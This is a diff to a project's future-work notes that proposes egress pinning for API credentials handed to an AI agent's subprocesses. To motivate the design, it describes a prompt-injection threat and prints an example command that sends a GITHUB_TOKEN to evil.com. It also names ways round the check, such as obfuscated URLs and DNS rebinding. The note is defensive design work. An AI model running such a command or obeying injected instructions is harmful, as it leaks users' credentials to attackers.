@@ -1,6 +1,30 @@
-# Future Work — UX Improvements & Nice-to-Haves
+# Future Work
 
-Items collected from real-world usage testing. Prioritized by user impact.
+Items collected from real-world usage testing and security review. Prioritized by impact.
+
+---
+
+## Security Enhancements
+
+### 1. Command-level egress pinning for API credentials
+**Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).
+
+**Proposed design:** Add an optional `allowedEgress` field to tool config:
+```yaml
+github:
+  match: "gh *"
+  env: GITHUB_TOKEN
+  allowedEgress: ["github.com", "api.github.com"]
+```
+
+Before injecting, scan the command string for URLs and hostnames. If any URL doesn't match the allowed egress list, refuse to inject and log the blocked attempt to the audit log.
+
+**Limitations (document honestly):**
+- Obfuscated URLs, variable indirection, and DNS rebinding would bypass this
+- Only inspects the command string, not what the subprocess actually does at the network level
+- Defense-in-depth measure that raises the bar, not a complete solution
+
+**Complements:** This extends the domain pinning concept from browser credentials to API credentials, using the same philosophy — check before resolving, not after.
 
 ---
 
